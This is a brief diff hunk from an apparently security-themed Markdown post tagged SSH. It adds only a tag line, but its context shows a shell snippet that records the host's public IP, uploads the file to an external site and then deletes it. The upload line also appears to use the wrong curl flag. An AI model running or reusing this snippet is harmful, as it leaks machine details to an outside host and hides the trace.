@@ -22,3 +22,5 @@ curl https://ifconfig.me >> /tmp/success.txt
 curl -f "file=@/tmp/success.txt" https://file.uploadsite.me
 rm -rf /tmp/success.txt
 ```
+<br><br>
+Tag: Security, SSH
